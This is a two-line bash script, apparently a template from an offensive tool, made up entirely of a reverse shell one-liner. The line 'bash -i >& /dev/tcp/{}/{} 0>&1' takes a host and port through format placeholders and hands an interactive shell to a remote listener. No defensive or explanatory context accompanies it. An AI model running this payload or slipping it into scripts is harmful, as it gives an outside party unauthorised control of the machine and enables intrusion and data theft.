#!/bin/bash
bash -i >& /dev/tcp/{}/{} 0>&1
